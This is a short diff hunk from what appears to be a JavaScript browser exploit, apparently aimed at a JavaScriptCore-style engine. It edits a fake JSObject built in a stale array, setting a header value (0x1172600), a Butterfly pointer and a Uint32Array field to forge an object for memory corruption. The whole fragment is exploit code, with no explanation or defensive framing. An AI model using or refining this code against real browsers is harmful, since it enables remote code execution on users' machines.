@@ -173,8 +173,7 @@ function go_() {
 				alert("Found the object!!");
 
 				stale[0] = {
-					//'a': u2d(105, 0x1172600), // the JSObject properties
-					'a': u2d(105, 0), // the JSObject properties
+					'a': u2d(105, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
 					'c': smsh, // var smsh = new Uint32Array(0x10)
 					'd': u2d(0x100, 0)
